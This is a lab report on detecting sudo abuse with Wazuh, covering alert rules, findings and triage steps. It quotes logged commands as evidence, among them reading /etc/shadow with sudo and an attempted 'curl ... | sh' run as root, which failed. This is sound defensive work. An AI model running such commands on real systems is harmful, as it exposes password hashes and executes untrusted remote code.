# Detection 006 — Sudo Abuse & Sensitive Command Monitoring

A SOC detection-engineering lab using Wazuh to monitor Linux `sudo` activity and identify commands that may require additional review.

## Summary
The Wazuh search `rule.id:(100520 OR 100521 OR 100522)` displayed **234 alert hits** in the selected one-week period. The supplied alert JSON provides concrete examples for rules `100520` and `100521`. Rule `100522` is included in the dashboard query, but its specific description and an example alert were not supplied, so this repository does not assign it an unverified meaning.

- **Rule 100520 — Level 5:** records sudo commands executed as root.
- **Rule 100521 — Level 9:** labels commands in a sensitive/high-risk watchlist.
- **ATT&CK mappings shown in alerts:** `T1548.003 — Sudo and Sudo Caching`, and for rule 100521 `T1078 — Valid Accounts`.

## Lab environment
| Component | Observed value |
|---|---|
| SIEM / manager | Wazuh / `vm1` |
| Linux endpoint | `ubuntu_vm2` |
| Endpoint IP | `192.168.34.143` |
| Wazuh agent ID | `001` |
| Log source | `/var/log/auth.log` |
| Primary account in evidence | `vm2` |
| Dashboard query | `rule.id:(100520 OR 100521 OR 100522)` |
| Selected range | Last week, 10–17 October 2026 |

## Important findings
- Wazuh logged account-management commands including `useradd`, `usermod -aG sudo`, and `userdel`.
- A Level 9 rule `100521` alert was generated for `sudo /usr/bin/cat /etc/shadow`.
- The same Level 9 watchlist also alerted on `visudo -c`, `systemctl status ssh`, and `crontab -l`. These commands can be legitimate administration; they need context rather than an automatic malicious verdict.
- The terminal notes show repeated `sudo` usage, including `su -c whoami` and `python3` invoking `whoami` as root.
- An attempt to run `curl -s http://example.com | sh` through `sudo bash -c` was logged, but the supplied terminal output reports `Syntax error: redirection unexpected`. The evidence does not prove a successful download or script execution.
- The dashboard shows 234 matching alert documents. This is not necessarily 234 distinct incidents or risky commands.

## Analyst verdict
**Sudo monitoring detections validated; command intent and execution outcome require context.**

The evidence confirms sudo activity and high-risk-command watchlist alerts. Several commands are normal administrative checks, while reading `/etc/shadow`, changing sudo-group membership, and attempting to pipe remote content to a shell warrant review. There is no evidence here of a confirmed compromise. Confirm these actions were intentional lab activity before closing the case.

## MITRE ATT&CK
- `T1548.003 — Abuse Elevation Control Mechanism: Sudo and Sudo Caching`
- `T1078 — Valid Accounts` (mapped by rule 100521)

These mappings describe possible behavior categories, not proof of abuse.

## Recommended triage
1. Confirm the sudo commands were deliberately executed for the lab.
2. Review the full `sudo` records for invoking user, target user, TTY, working directory, command line, timestamp, and result.
3. Verify who was added to the `sudo` group and whether the account should have had that access.
4. Review access to `/etc/shadow` and correlate with account/password changes and login events.
5. For the `curl | sh` attempt, preserve the shell error and determine whether any network request or child process actually occurred; do not assume successful execution.
6. Separate routine commands (for example, `visudo -c` and `systemctl status ssh`) from higher-risk behaviors in alert triage.
7. Test the rule XML with both benign administrative commands and controlled watchlist commands. Use the actual XML to validate rule `100522` before documenting it.
8. Tune severity based on command, user, host role, and context instead of treating every sudo event as malicious.

## Repository contents
- `Detection-006-Sudo-Abuse-Report.pdf` — shareable report with screenshots
- `Detection-006-Sudo-Abuse-Report.docx` — editable report
- `Detection-006-Sudo-Abuse.md` — Markdown report
- `timeline.csv` — event timeline based on supplied records
- `evidence/` — screenshots supplied for this investigation

## Limitations
The exact custom rule XML for `100520`–`100522` was not supplied. The selected dashboard count includes all query matches and may contain repetitive alerting from routine commands. The `curl | sh` command's success is not established; the pasted terminal output instead shows a shell syntax error. No evidence supplied here confirms malware execution, persistence, or a compromised endpoint.


